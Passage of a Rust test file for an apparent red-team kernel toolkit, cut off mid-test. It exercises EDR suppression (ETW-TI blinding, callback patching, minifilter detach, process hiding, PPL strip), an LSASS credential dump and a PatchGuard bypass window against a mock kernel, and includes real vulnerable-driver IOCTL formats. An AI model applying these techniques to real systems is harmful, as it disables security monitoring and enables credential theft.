//! Red-team operation-chain scenario tests (kernelsdk wave-2).
//!
//! The per-kit unit tests cover single operations against isolated mocks.
//! This module chains them into end-to-end engagement flows against ONE shared
//! fake kernel image, asserting the state transitions across kit boundaries:
//!
//! - **Chain (a) — EDR suppression**: assessment → BYOVD driver selection
//!   (availability + `supports_va` fallback) → ETW-TI blind (4-hop) → callback
//!   neutralize → MiniFilter detach → DKOM process hide → PPL strip — every
//!   kernel read/write going through a real vulnerable-driver IOCTL wire
//!   format (RTCore64 byte-loop), emulated by a mock `DeviceIoControl`.
//! - **Chain (b) — credentials**: physical-memory LSASS dump (process-list
//!   walk → DTB → 4-level page walk → sparse image window) → minidump
//!   assembly (`nyx-minidump-assembler`, read-only public API) → parse with
//!   the reference `minidump` crate.
//! - **Chain (c) — PatchGuard window + offsets table**: patch-equivalent
//!   build fallback → capability-driven PG window selection (thread-suspend
//!   vs timing-repair) → DKOM edits inside the window → guard-Drop repair;
//!   plus the preferred offset-free Peekaboo strategy (hide preserving links
//!   → guard-Drop re-link).
//!
//! All kernel state lives in sparse byte maps; no real driver, no real
//! kernel, no network. Runs on the macOS dev host and under wine64.

use crate::byovd::{RwOp, VulnDriverIoctl};
use crate::byovd_drivers::{Iqvw64e, RtCore64, Shield, WdtKernel};
use crate::etwti::{EtwTiBlind, EtwTiOffsets};
use crate::netsec::{KernelLsassReader, DIRECTORY_TABLE_BASE};
use crate::offsets::{EprocessOffsets, PgContextOffsets, RuntimeOffsets};
use crate::persistence::{
    PeekabooProbe, PeekabooWindow, PplStripper, ProcessHider, RuntimePgBypassWindow,
    TimingRepairWindow,
};
use crate::telemetry::{CallbackNeutralizer, MiniFilterUnlinker};
use crate::{
    CallbackKit, CredKit, EtwTiKit, KernelRw, KitError, KrwError, MiniFilterKit, PatchGuardKit,
    ProcHideKit, PplKit,
};
use alloc::boxed::Box;
use alloc::collections::BTreeMap;
use alloc::vec::Vec;
use core::ffi::c_void;
use spin::mutex::Mutex;

// ===========================================================================
// Shared fake kernel image (VA space) / fake physical memory (PA space)
// ===========================================================================

/// Sparse byte map standing in for kernel memory (VA-keyed) or physical
/// memory (PA-keyed), depending on the accessor. Unwritten bytes read as 0
/// (freshly-zeroed pool / RAM).
struct FakeKernel {
    mem: Mutex<BTreeMap<usize, u8>>,
}

impl FakeKernel {
    fn new() -> Self {
        Self {
            mem: Mutex::new(BTreeMap::new()),
        }
    }
    fn write(&self, addr: usize, bytes: &[u8]) {
        let mut m = self.mem.lock();
        for (i, b) in bytes.iter().enumerate() {
            m.insert(addr + i, *b);
        }
    }
    fn read(&self, addr: usize, len: usize) -> Vec<u8> {
        let m = self.mem.lock();
        (0..len).map(|i| *m.get(&(addr + i)).unwrap_or(&0)).collect()
    }
    fn read_u8(&self, addr: usize) -> u8 {
        *self.mem.lock().get(&addr).unwrap_or(&0)
    }
    fn read_u64(&self, addr: usize) -> u64 {
        u64::from_le_bytes(self.read(addr, 8).try_into().unwrap())
    }
    fn write_u64(&self, addr: usize, v: u64) {
        self.write(addr, &v.to_le_bytes());
    }
}

/// Pass-through `KernelRw` over a `FakeKernel` in **VA** semantics (the base
/// `KernelRw` contract — what the BYOVD/KslD impls present).
struct VaRw<'a>(&'a FakeKernel);
impl KernelRw for VaRw<'_> {
    fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
        dst.copy_from_slice(&self.0.read(kaddr, dst.len()));
        Ok(())
    }
    fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
        self.0.write(kaddr, src);
        Ok(())
    }
}

/// Pass-through `KernelRw` over a `FakeKernel` in **physical** semantics —
/// the `KernelRwAddressSpace::Physical` extension contract that
/// `KernelLsassReader::read_process_mem` requires for its page-walk reads.
struct PhysRw<'a>(&'a FakeKernel);
impl KernelRw for PhysRw<'_> {
    fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
        dst.copy_from_slice(&self.0.read(kaddr, dst.len()));
        Ok(())
    }
    fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
        self.0.write(kaddr, src);
        Ok(())
    }
}

// ===========================================================================
// Vulnerable-driver device emulation (the kernel side of the IOCTLs)
// ===========================================================================

thread_local! {
    /// The fake kernel image the mock `DeviceIoControl` operates on. Set by
    /// `DriverRw` around every `raw_rw` call (fn pointers can't capture).
    static ACTIVE_KERNEL: core::cell::Cell<*const FakeKernel> =
        const { core::cell::Cell::new(core::ptr::null()) };
}

/// Mock `kernel32!DeviceIoControl`: emulates the DEVICE side of each
/// vulnerable driver's memory R/W IOCTL against the thread's `FakeKernel`.
/// Only the documented wire formats are implemented — a wrong IOCTL code or
/// request layout fails the call (returns 0), exactly like a real driver
/// rejecting a malformed IRP.
unsafe extern "system" fn mock_dioctl(
    _device: *mut c_void,
    ioctl: u32,
    in_buf: *const c_void,
    in_len: u32,
    out_buf: *mut c_void,
    out_len: u32,
    bytes_returned: *mut u32,
    _overlapped: *mut c_void,
) -> i32 {
    let k = ACTIVE_KERNEL.with(|c| c.get());
    if k.is_null() {
        return 0;
    }
    let kernel = unsafe { &*k };
    const KERNEL_SPACE: u64 = 0xFFFF_8000_0000_0000;
    match ioctl {
        // RTCore64: 48-byte MemoryOperation, address @ 0x08, size @ 0x18,
        // data @ 0x1C. Same buffer in/out (METHOD_BUFFERED).
        0x8000_2048 | 0x8000_204C => {
            let pkt = unsafe { core::slice::from_raw_parts_mut(out_buf as *mut u8, out_len as usize) };
            let addr = u64::from_le_bytes(pkt[0x08..0x10].try_into().unwrap()) as usize;
            let size = u32::from_le_bytes(pkt[0x18..0x1C].try_into().unwrap()) as usize;
            if size > 4 || 0x1C + size > pkt.len() {
                return 0;
            }
            if ioctl == 0x8000_2048 {
                // Read: kernel → data field.
                let data = kernel.read(addr, size);
                pkt[0x1C..0x1C + size].copy_from_slice(&data);
            } else {
                // Write: data field → kernel.
                let data = pkt[0x1C..0x1C + size].to_vec();
                kernel.write(addr, &data);
                let _ = (in_buf, in_len);
            }
            unsafe { *bytes_returned = out_len };
            1
        }
        // iqvw64e: single dispatch IOCTL, case 0x33 = kernel-side memcpy of
        // arbitrary length. src/dst @ 0x10/0x18, length @ 0x20.
        0x8086_2007 => {
            let req = unsafe { core::slice::from_raw_parts(in_buf as *const u8, in_len as usize) };
            if req.len() < 40 || u64::from_le_bytes(req[0x00..0x08].try_into().unwrap()) != 0x33 {
                return 0;
            }
            let src = u64::from_le_bytes(req[0x10..0x18].try_into().unwrap());
            let dst = u64::from_le_bytes(req[0x18..0x20].try_into().unwrap());
            let len = u64::from_le_bytes(req[0x20..0x28].try_into().unwrap()) as usize;
            if dst >= KERNEL_SPACE {
                // user → kernel: src is a live host pointer.
                let data = unsafe { core::slice::from_raw_parts(src as *const u8, len) };
                kernel.write(dst as usize, data);
            } else {
                // kernel → user: dst is a live host pointer.
                let data = kernel.read(src as usize, len);
                unsafe { core::ptr::copy_nonoverlapping(data.as_ptr(), dst as *mut u8, len) };
            }
            1
        }
        // Shield: one bidirectional IOCTL. direction @ 0x40 (0 = k→u),
        // length @ 0x44, kaddr @ 0x48, payload after the 0x50 header.
        0x9610_2014 => {
            let pkt = unsafe { core::slice::from_raw_parts_mut(out_buf as *mut u8, out_len as usize) };
            let direction = pkt[0x40];
            let len = u32::from_le_bytes(pkt[0x44..0x48].try_into().unwrap()) as usize;
            let kaddr = u64::from_le_bytes(pkt[0x48..0x50].try_into().unwrap()) as usize;
            if 0x50 + len > pkt.len() {
                return 0;
            }
            if direction == 0 {
                let data = kernel.read(kaddr, len);
                pkt[0x50..0x50 + len].copy_from_slice(&data);
            } else {
                let data = pkt[0x50..0x50 + len].to_vec();
                kernel.write(kaddr, &data);
            }
            1
        }
        _ => 0,
    }
}

/// A `KernelRw` backed by a vulnerable driver's REAL wire protocol
/// (`VulnDriverIoctl::raw_rw`) over the mock device — mirrors
/// `byovd::ByovdDriver`'s kread/kwrite contract (including the `supports_va`
/// gate), but constructible in tests without opening a device HANDLE.
struct DriverRw<'a> {
    driver: Box<dyn VulnDriverIoctl>,
    kernel: &'a FakeKernel,
}

impl KernelRw for DriverRw<'_> {
    fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
        if dst.is_empty() {
            return Ok(());
        }
        if !self.driver.supports_va() {
            return Err(KrwError::Unavailable(
                "driver is physical-address-only — kernel-VA reads unsupported",
            ));
        }
        ACTIVE_KERNEL.with(|c| c.set(self.kernel as *const FakeKernel));
        let r = unsafe {
            self.driver
                .raw_rw(RwOp::Read, kaddr as u64, dst, core::ptr::null_mut(), mock_dioctl)
        };
        r.map_err(|ok| KrwError::Partial { ok })
    }
    fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
        if src.is_empty() {
            return Ok(());
        }
        if !self.driver.supports_va() {
            return Err(KrwError::Unavailable(
                "driver is physical-address-only — kernel-VA writes unsupported",
            ));
        }
        ACTIVE_KERNEL.with(|c| c.set(self.kernel as *const FakeKernel));
        let mut buf = src.to_vec();
        let r = unsafe {
            self.driver
                .raw_rw(RwOp::Write, kaddr as u64, &mut buf, core::ptr::null_mut(), mock_dioctl)
        };
        r.map_err(|ok| KrwError::Partial { ok })
    }
}

/// Operator-side driver selection with availability fallback: iterate the
/// candidate pack in priority order, skip drivers whose device did not open
/// (simulated by `present_devices`) and drivers that cannot consume kernel
/// VAs at all (`supports_va` — the permanent WDTKernel-style mismatch),
/// return the first usable one. Logs every probe into `tried`.
fn select_first_usable_driver(
    present_devices: &[&[u16]],
    tried: &mut Vec<&'static str>,
) -> Option<Box<dyn VulnDriverIoctl>> {
    let candidates: Vec<(&'static str, Box<dyn VulnDriverIoctl>)> = alloc::vec![
        ("shield", Box::new(Shield)),
        ("rtcore64", Box::new(RtCore64)),
        ("iqvw64e", Box::new(Iqvw64e)),
        ("wdtkernel", Box::new(WdtKernel)),
    ];
    for (name, driver) in candidates {
        tried.push(name);
        if !present_devices.iter().any(|p| *p == driver.device_path()) {
            continue; // CreateFileW failed — device not present on this host.
        }
        if !driver.supports_va() {
            continue; // Physical-only primitive — cannot serve the VA contract.
        }
        return Some(driver);
    }
    None
}

// ===========================================================================
// Chain (a) — full EDR suppression chain over one fake kernel
// ===========================================================================

// Fake kernel layout (all canonical kernel VAs, distinct regions per
// subsystem). ntoskrnl occupies [NT_BASE, NT_BASE + NT_SIZE).
const NT_BASE: usize = 0xFFFF_8000_1000_0000;
const NT_SIZE: usize = 0x00C0_0000;
const ETW_HANDLE: usize = NT_BASE + 0x30_0000; // nt!EtwThreatIntProvRegHandle
const CP_ARRAY: usize = NT_BASE + 0x40_0000; // PspCreateProcessNotifyRoutine
const CT_ARRAY: usize = NT_BASE + 0x40_1000; // PspCreateThreadNotifyRoutine
const LI_ARRAY: usize = NT_BASE + 0x40_2000; // PspLoadImageNotifyRoutine
const PS_HEAD: usize = NT_BASE + 0x50_0000; // nt!PsActiveProcessHead
const GUID_ENTRY: usize = 0xFFFF_8000_6000_0000; // ETW-TI _ETW_GUID_ENTRY
const PROV_BLOCK: usize = 0xFFFF_8000_6000_1000; // provider block
const FLTG: usize = 0xFFFF_8000_2000_0000; // FLTMGR!FltGlobals
const FRAME: usize = 0xFFFF_8000_2000_1000; // _FLTP_FRAME
const FILTER1: usize = 0xFFFF_8000_2000_3000; // EDR minifilter #1
const FILTER2: usize = 0xFFFF_8000_2000_4000; // EDR minifilter #2
const E_SYS: usize = 0xFFFF_8000_3000_0000; // EPROCESS System (PID 4)
const E_LSASS: usize = 0xFFFF_8000_3001_0000; // EPROCESS lsass (PID 700)
const E_BEACON: usize = 0xFFFF_8000_3002_0000; // EPROCESS beacon (PID 4000)
const CTX_DISP: usize = 0xFFFF_8000_5000_0000; // callback ctx: nt! dispatcher
const CTX_EDR_CP: usize = 0xFFFF_8000_5000_1000; // callback ctx: EDR process cb
const CTX_EDR_LI: usize = 0xFFFF_8000_5000_2000; // callback ctx: EDR image cb
const EDR_CODE: usize = 0xFFFF_8000_4000_0000; // edr.sys .text

/// Pack a callback-context pointer into a Ps*NotifyRoutine slot (bit 0 =
/// occupied, inverse of `offsets::notify_routines::unpack`).
fn pack_slot(ctx: usize) -> u64 {
    (ctx as u64) | 1
}

/// Build the process list System(4) ↔ lsass(700) ↔ beacon(4000) doubly linked
/// both directions (find_eprocess follows Flink; unlink needs both).
fn build_process_list(k: &FakeKernel, head: usize, entries: &[(usize, u32)], o: &EprocessOffsets) {
    let link = |e: usize| e + o.active_process_links;
    let first = link(entries[0].0);
    let last = link(entries[entries.len() - 1].0);
    k.write_u64(head, first as u64); // head.Flink
    k.write_u64(head + 8, last as u64); // head.Blink
    for (i, (e, pid)) in entries.iter().enumerate() {
        let l = link(*e);
        let flink = if i + 1 < entries.len() {
            link(entries[i + 1].0)
        } else {
            head
        };
        let blink = if i > 0 { link(entries[i - 1].0) } else { head };
        k.write_u64(l, flink as u64);
        k.write_u64(l + 8, blink as u64);
        k.write_u64(e + o.unique_process_id, *pid as u64);
    }
}

#[test]
fn edr_suppression_chain_end_to_end() {
    let build = 19041u32; // Win10 2004 — canonical table row.
    let kernel = FakeKernel::new();

    // ---- Step 0: operator-side assessment -------------------------------
    // No live kernel primitive yet → the honest assessment reports
    // NotAssessed on the dev host (never a fabricated "clean"), and the
    // operator falls back to the version-pinned offsets table for 19041.
    let assessment = unsafe { crate::assess_kernel(None) };
    #[cfg(not(target_os = "windows"))]
    assert_eq!(
        assessment.status,
        crate::KernelAssessmentStatus::NotAssessed,
        "no primitive + non-Windows host must never fabricate a clean kernel"
    );
    #[cfg(target_os = "windows")]
    let _ = assessment.status; // under wine the NtQuery paths may return data
    let eproc = crate::offsets::for_build(build)
        .expect("19041 is a canonical table row")
        .offsets;

    // ---- Step 1: BYOVD driver selection with availability fallback ------
    // Shield (clean, preferred) is absent on this host; RTCore64 + iqvw64e
    // devices opened. The selector must skip Shield and pick RTCore64 — and
    // must never pick WDTKernel (physical-only, fails the VA contract).
    let rtc_path = RtCore64.device_path();
    let iqv_path = Iqvw64e.device_path();
    let present: &[&[u16]] = &[rtc_path, iqv_path];
    let mut tried = Vec::new();
    let driver = select_first_usable_driver(present, &mut tried).expect("a usable driver exists");
    assert_eq!(
        tried,
        alloc::vec!["shield", "rtcore64"],
        "Shield probed first (absent), RTCore64 selected, later candidates untouched"
    );
    assert_eq!(driver.device_path(), rtc_path);
    assert!(
        driver.blocklist_status().contains("BLOCKLISTED"),
        "operator accepted a blocklisted fallback — it must be logged"
    );
    // The physical-only driver is permanently unusable for the VA contract,
    // even when its device opens (kernelsdk-1-6).
    let wdt_present: &[&[u16]] = &[WdtKernel.device_path()];
    let mut tried2 = Vec::new();
    assert!(select_first_usable_driver(wdt_present, &mut tried2).is_none());
    assert_eq!(tried2.len(), 4, "every candidate probed, none usable");

    // Every subsequent kernel op rides RTCore64's real 1-byte-per-IOCTL wire
    // format against the shared fake kernel image.
    let rw = DriverRw {
        driver,
        kernel: &kernel,
    };

    // ---- Step 2: ETW-TI blind (4-hop chase + single data write) ---------
    let etw_off = EtwTiOffsets::for_build(build).expect("19041 ETW-TI offsets");
    kernel.write_u64(ETW_HANDLE, GUID_ENTRY as u64);
    kernel.write_u64(GUID_ENTRY + etw_off.guid_entry_to_provider_block, PROV_BLOCK as u64);
    let is_enabled_kva =
        PROV_BLOCK + etw_off.provider_block_to_enable_info + etw_off.is_enabled_within_enable_info;
    kernel.write_u64(is_enabled_kva, 1); // provider ENABLED before the blind
    let etw = EtwTiBlind {
        prov_reg_handle_kva: ETW_HANDLE,
        offsets: etw_off,
    };
    assert!(!etw.is_blinded(&rw).unwrap(), "provider enabled before blind");
    etw.blind(&rw).expect("ETW-TI blind over RTCore64");
    assert!(etw.is_blinded(&rw).unwrap());
    assert_eq!(kernel.read_u64(is_enabled_kva), 0, "IsEnabled write landed");

    // ---- Step 3: Ps*NotifyRoutine neutralize (selective) ----------------
    // Slot 0 of the CreateProcess array is the nt! dispatcher (routine inside
    // ntoskrnl's range) — must be SKIPPED. The EDR's process + image callbacks
    // (routines in edr.sys) get their entry byte overwritten with `ret`.
    let runtime = RuntimeOffsets {
        create_process_notify_array_kva: CP_ARRAY,
        create_thread_notify_array_kva: CT_ARRAY,
        load_image_notify_array_kva: LI_ARRAY,
        ps_active_process_head_kva: PS_HEAD,
        etw_ti_handle_kva: ETW_HANDLE,
        flt_globals_kva: FLTG,
        ntoskrnl_base: NT_BASE,
        ntoskrnl_size: NT_SIZE,
    };
    kernel.write_u64(CP_ARRAY, pack_slot(CTX_DISP)); // slot 0: dispatcher
    kernel.write_u64(CTX_DISP, (NT_BASE + 0x1_2340) as u64); // → nt! code
    kernel.write(NT_BASE + 0x1_2340, &[0x40]);
    kernel.write_u64(CP_ARRAY + 5 * 8, pack_slot(CTX_EDR_CP)); // slot 5: EDR
    kernel.write_u64(CTX_EDR_CP, (EDR_CODE + 0x130) as u64);
    kernel.write(EDR_CODE + 0x130, &[0x55]); // push rbp
    kernel.write_u64(LI_ARRAY + 2 * 8, pack_slot(CTX_EDR_LI)); // slot 2: EDR
    kernel.write_u64(CTX_EDR_LI, (EDR_CODE + 0x230) as u64);
    kernel.write(EDR_CODE + 0x230, &[0x55]);

    let callbacks = CallbackNeutralizer { runtime };
    let neutralized = callbacks.neutralize(&rw).expect("neutralize");
    assert_eq!(neutralized, 2, "two EDR callbacks, dispatcher skipped");
    assert_eq!(kernel.read_u8(EDR_CODE + 0x130), 0xC3, "EDR process cb → ret");
    assert_eq!(kernel.read_u8(EDR_CODE + 0x230), 0xC3, "EDR image cb → ret");
    assert_eq!(
        kernel.read_u8(NT_BASE + 0x1_2340),
        0x40,
        "nt! dispatcher untouched (PatchGuard-safe)"
    );

    // ---- Step 4: MiniFilter detach (FltGlobals → RegisteredFilters) -----
    use crate::offsets::flt;
    let f1_link = FILTER1 + flt::FLT_OBJECT_PRIMARY_LINK;
    let f2_link = FILTER2 + flt::FLT_OBJECT_PRIMARY_LINK;
    let reg_head = FRAME + flt::FLTP_FRAME_REGISTERED_FILTERS;
    kernel.write_u64(FLTG + flt::GLOBALS_FRAME_LIST, (FRAME + flt::FLTP_FRAME_LINKS) as u64);
    // RegisteredFilters: head ↔ F1 ↔ F2 ↔ head.
    kernel.write_u64(reg_head, f1_link as u64);
    kernel.write_u64(reg_head + 8, f2_link as u64);
    kernel.write_u64(f1_link, f2_link as u64);
    kernel.write_u64(f1_link + 8, reg_head as u64);
    kernel.write_u64(f2_link, reg_head as u64);
    kernel.write_u64(f2_link + 8, f1_link as u64);

    let minifilter = MiniFilterUnlinker {
        flt_globals_kva: FLTG,
    };
    minifilter.detach_edr(&rw).expect("detach all minifilters");
    assert_eq!(kernel.read_u64(reg_head), reg_head as u64, "list emptied");
    assert_eq!(kernel.read_u64(reg_head + 8), reg_head as u64);
    assert_eq!(kernel.read_u64(f1_link), f1_link as u64, "F1 self-looped");
    assert_eq!(kernel.read_u64(f2_link), f2_link as u64, "F2 self-looped");

    // ---- Step 5: DKOM process hide --------------------------------------
    build_process_list(
        &kernel,
        PS_HEAD,
        &[(E_SYS, 4), (E_LSASS, 700), (E_BEACON, 4000)],
        &eproc,
    );
    let hider = ProcessHider {
        ps_active_process_head_kva: PS_HEAD,
        offsets: eproc,
    };
    hider.hide(&rw, 4000).expect("hide beacon");
    assert!(
        matches!(
            ProcessHider::find_eprocess(&rw, PS_HEAD, 4000, &eproc),
            Err(KitError::NotFound)
        ),
        "beacon no longer enumerable"
    );
    // lsass now links directly to the head (beacon excised cleanly).
    assert_eq!(
        kernel.read_u64(E_LSASS + eproc.active_process_links),
        PS_HEAD as u64
    );
    assert_eq!(kernel.read_u64(PS_HEAD + 8), (E_LSASS + eproc.active_process_links) as u64);
    // ...and the remaining processes are still enumerable.
    assert_eq!(
        ProcessHider::find_eprocess(&rw, PS_HEAD, 700, &eproc).unwrap(),
        E_LSASS
    );

    // ---- Step 6: PPL strip on the EDR's protected process ----------------
    kernel.write(E_LSASS + eproc.protection, &[0x61]); // PP(L) Antimalware
    kernel.write(E_LSASS + eproc.signature_level, &[0x3F]);
    kernel.write(E_LSASS + eproc.section_signature_level, &[0x3F]);
    let stripper = PplStripper {
        ps_active_process_head_kva: PS_HEAD,
        offsets: eproc,
    };
    stripper.attack_edr_ppl(&rw, 700).expect("strip lsass PPL");
    assert_eq!(kernel.read_u8(E_LSASS + eproc.protection), 0);
    assert_eq!(kernel.read_u8(E_LSASS + eproc.signature_level), 0);
    assert_eq!(kernel.read_u8(E_LSASS + eproc.section_signature_level), 0);

    // ---- End state: every suppression is simultaneously in effect --------
    assert!(etw.is_blinded(&rw).unwrap(), "blind persists at chain end");
}

/// The same chain over Shield's single-IOCTL bidirectional protocol must
/// produce the identical end state — proving the kits are driver-agnostic
/// and the protocol seam carries them all.
#[test]
fn etw_ti_blind_over_shield_and_iqvw64e_protocols() {
    for driver in [
        Box::new(Shield) as Box<dyn VulnDriverIoctl>,
        Box::new(Iqvw64e),
    ] {
        let kernel = FakeKernel::new();
        let rw = DriverRw {
            driver,
            kernel: &kernel,
        };
        let etw_off = EtwTiOffsets::for_build(19041).unwrap();
        kernel.write_u64(ETW_HANDLE, GUID_ENTRY as u64);
        kernel.write_u64(GUID_ENTRY + etw_off.guid_entry_to_provider_block, PROV_BLOCK as u64);
        let kva = PROV_BLOCK
            + etw_off.provider_block_to_enable_info
            + etw_off.is_enabled_within_enable_info;
        kernel.write_u64(kva, 1);
        let etw = EtwTiBlind {
            prov_reg_handle_kva: ETW_HANDLE,
            offsets: etw_off,
        };
        etw.blind(&rw).expect("blind over this driver");
        assert_eq!(kernel.read_u64(kva), 0);
        // Round-trip sanity: a 24-byte multi-byte read through the same wire.
        kernel.write(EDR_CODE, &[0xAB; 24]);
        let mut buf = [0u8; 24];
        rw.kread(EDR_CODE, &mut buf).expect("multi-byte read");
        assert_eq!(buf, [0xAB; 24]);
    }
}

// ===========================================================================
// Chain (b) — credentials: kernel LSASS read → minidump assembly → parse
// ===========================================================================

/// Map one 4 KiB page in the fake page tables rooted at `dtb`, allocating
/// intermediate tables from the `bump` allocator. Mirrors what the OS would
/// have built for LSASS's address space.
fn map_page_4kb(k: &FakeKernel, dtb: u64, va: u64, pa: u64, bump: &mut u64) {
    let ensure_table = |entry_pa: u64, bump: &mut u64| -> u64 {
        let cur = k.read_u64(entry_pa as usize);
        if cur & 1 != 0 {
            return cur & 0x000F_FFFF_FFFF_F000;
        }
        let table = *bump;
        *bump += 0x1000;
        k.write_u64(entry_pa as usize, table | 1); // present
        table
    };
    let pml4 = dtb & 0x000F_FFFF_FFFF_F000;
    let pdpt = ensure_table(pml4 + ((va >> 39) & 0x1FF) * 8, bump);
    let pd = ensure_table(pdpt + ((va >> 30) & 0x1FF) * 8, bump);
    let pt = ensure_table(pd + ((va >> 21) & 0x1FF) * 8, bump);
    k.write_u64((pt + ((va >> 12) & 0x1FF) * 8) as usize, pa | 1);
}

#[test]
fn credential_chain_lsass_dump_to_parseable_minidump() {
    let build = 19041u32;
    let eproc = crate::offsets::for_build(build).unwrap().offsets;

    // ---- Fake physical memory: process list + LSASS address space --------
    let phys = FakeKernel::new();
    const PS_HEAD_PA: usize = 0x10_0000;
    const E_SYS_PA: usize = 0x20_0000;
    const E_LSASS_PA: usize = 0x30_0000;
    const LSASS_DTB: u64 = 0x50_0000;
    const PEB_PA: usize = 0x60_0000;
    const IMAGE_PA: usize = 0x70_0000;
    const PEB_VA: u64 = 0x0000_7FF0_0000_0000;
    const LSASS_BASE: u64 = 0x0000_0140_0000_0000; // classic pre-ASLR layout

    build_process_list(&phys, PS_HEAD_PA, &[(E_SYS_PA, 4), (E_LSASS_PA, 700)], &eproc);
    phys.write_u64(E_LSASS_PA + DIRECTORY_TABLE_BASE, LSASS_DTB);
    phys.write_u64(E_LSASS_PA + eproc.peb, PEB_VA);

    // Page tables: PEB page + ONLY the first image page — the rest of the
    // 1 MiB capture window is unmapped (sparse image, gaps zero-filled).
    let mut bump = 0x51_0000u64;
    map_page_4kb(&phys, LSASS_DTB, PEB_VA, PEB_PA as u64, &mut bump);
    map_page_4kb(&phys, LSASS_DTB, LSASS_BASE, IMAGE_PA as u64, &mut bump);
    // PEB.ImageBaseAddress @ +0x10 → LSASS_BASE.
    phys.write_u64(PEB_PA + 0x10, LSASS_BASE);
    // A minimal PE signature at the image base page.
    phys.write(IMAGE_PA, b"MZ");
    phys.write(IMAGE_PA + 0x3C, &0x80u32.to_le_bytes());
    phys.write(IMAGE_PA + 0x80, b"PE\0\0");

    // ---- Kernel-tier credential read (via the CredKit trait object) ------
    let rw = PhysRw(&phys);
    let reader = KernelLsassReader {
        ps_active_process_head_kva: PS_HEAD_PA,
        offsets: eproc,
    };
    let cred: &dyn CredKit = &reader;
    let (bytes, base_va) = cred
        .dump_lsass_with_base(&rw, 700)
        .expect("LSASS dump through process list + page walk");
    assert_eq!(base_va, LSASS_BASE, "base VA from PEB.ImageBaseAddress");
    assert_eq!(bytes.len(), 0x10_0000, "1 MiB capture window");
    assert_eq!(&bytes[0..2], b"MZ", "mapped image page captured");
    assert_eq!(&bytes[0x80..0x84], b"PE\0\0");
    assert!(
        bytes[0x2000..0x3000].iter().all(|b| *b == 0),
        "unmapped pages zero-filled, dump not aborted"
    );

    // ---- Operator-side minidump envelope + reference-crate parse ---------
    let dump = nyx_minidump_assembler::assemble_minidump(700, base_va, &bytes, build);
    let parsed = minidump::Minidump::read(dump.as_slice()).expect("minidump crate parses output");
    let memlist = parsed
        .get_stream::<minidump::MinidumpMemory64List>()
        .expect("Memory64List stream");
    let ranges: Vec<_> = memlist.iter().collect();
    assert_eq!(ranges.len(), 1);
    assert_eq!(ranges[0].base_address, LSASS_BASE);
    assert_eq!(ranges[0].size as usize, bytes.len());
    assert_eq!(&ranges[0].bytes[0..2], b"MZ", "raw capture survives the envelope");
    let sysinfo = parsed
        .get_stream::<minidump::MinidumpSystemInfo>()
        .expect("SystemInfo stream");
    assert_eq!(sysinfo.raw.processor_architecture, 9, "AMD64"); // PROCESSOR_ARCHITECTURE_AMD64
}

/// The dump must fail loudly (not return zeros) when the process list has no
/// such PID — the operator sees NotFound, never a fabricated empty capture.
#[test]
fn credential_chain_unknown_pid_is_not_found() {
    let eproc = crate::offsets::for_build(19041).unwrap().offsets;
    let phys = FakeKernel::new();
    build_process_list(&phys, 0x10_0000, &[(0x20_0000, 4)], &eproc);
    let rw = PhysRw(&phys);
    let reader = KernelLsassReader {
        ps_active_process_head_kva: 0x10_0000,
        offsets: eproc,
    };
    assert!(matches!(
        reader.dump_lsass_with_base(&rw, 1337),
        Err(KitError::NotFound)
    ));
}

// ===========================================================================
// Chain (c) — PatchGuard window + offsets table, integrated with DKOM edits
// ===========================================================================

const PRCB: usize = 0xFFFF_8000_7000_0000;
const PGCTX: usize = 0xFFFF_8000_7000_1000;
const PS_HEAD_C: usize = 0xFFFF_8000_3100_0000;
const E_TARGET: usize = 0xFFFF_8000_3101_0000;

/// PDB-verified PG-context offsets (what the bootstrap supplies after
/// per-build validation; the table rows stay placeholder/gated — see
/// `offsets::pg_context_usable_for_window`).
fn verified_pg_offsets(supports_thread_suspend: bool) -> PgContextOffsets {
    PgContextOffsets {
        prcb_pg_thread_offset: 0x190,
        context_valid_offset: 0x08,
        context_size: 0x200,
        supports_thread_suspend,
        verified: true,
    }
}

#[test]
fn pg_window_offsets_table_integrated_dkom_chain() {
    // ---- Offsets-table integration: patch-equivalent fallback ------------
    // 19045 is a patch-equivalent of the 19041 baseline (enablement package,
    // same kernel binary) — the table resolves it WITHOUT floor-matching.
    let eproc_build = crate::offsets::for_build(19045).expect("patch-equivalent resolves");
    assert_eq!(eproc_build.build, 19041, "19045 → 19041 baseline");
    let eproc = eproc_build.offsets;
    // Unknown future builds return None — the caller MUST probe, never guess.
    assert!(crate::offsets::for_build(99999).is_none());
    // The PG-context table is placeholder-only: the capability gate is OFF
    // (kernelsdk-1-1) until per-build PDB validation lands — the operator
    // path is a manually-verified offsets struct.
    assert!(!crate::offsets::pg_context_usable_for_window(19041));

    // ---- Build the engagement kernel state --------------------------------
    let kernel = FakeKernel::new();
    let rw = VaRw(&kernel);
    kernel.write_u64(PRCB + 0x190, PGCTX as u64); // PRCB → PG context
    kernel.write_u64(PGCTX + 0x08, 0); // PG idle between cycles
    build_process_list(&kernel, PS_HEAD_C, &[(E_SYS, 4), (E_TARGET, 4242)], &eproc);

    // ---- Capability-driven window selection ------------------------------
    // Win10 19041: no thread-suspend support → RuntimePgBypassWindow refuses,
    // the operator falls back to TimingRepairWindow (same selection logic as
    // win::select_pg_window's supports_thread_suspend branch).
    let pg_off = verified_pg_offsets(false);
    let rt_window = RuntimePgBypassWindow::new(pg_off, PRCB, &rw);
    assert!(
        matches!(
            rt_window.enter_unchecked(&rw),
            Err(KitError::UnsupportedPosture(_))
        ),
        "RuntimePgBypass must refuse a build without thread-suspend support"
    );
    let window = TimingRepairWindow::new(pg_off, PRCB, &rw);

    // ---- DKOM edit INSIDE the window --------------------------------------
    {
        let _guard = window.enter_unchecked(&rw).expect("PG idle → window opens");
        let hider = ProcessHider {
            ps_active_process_head_kva: PS_HEAD_C,
            offsets: eproc,
        };
        hider.hide(&rw, 4242).expect("hide inside PG window");
        assert!(matches!(
            ProcessHider::find_eprocess(&rw, PS_HEAD_C, 4242, &eproc),
            Err(KitError::NotFound)
        ));
    } // guard Drop → repair (re-zero valid flag, disarm)
    // The edit persists after the window closes; the repair wrote the flag.
    assert_eq!(kernel.read_u64(PGCTX + 0x08), 0, "repair kept the flag at 0");
    assert!(matches!(
        ProcessHider::find_eprocess(&rw, PS_HEAD_C, 4242, &eproc),
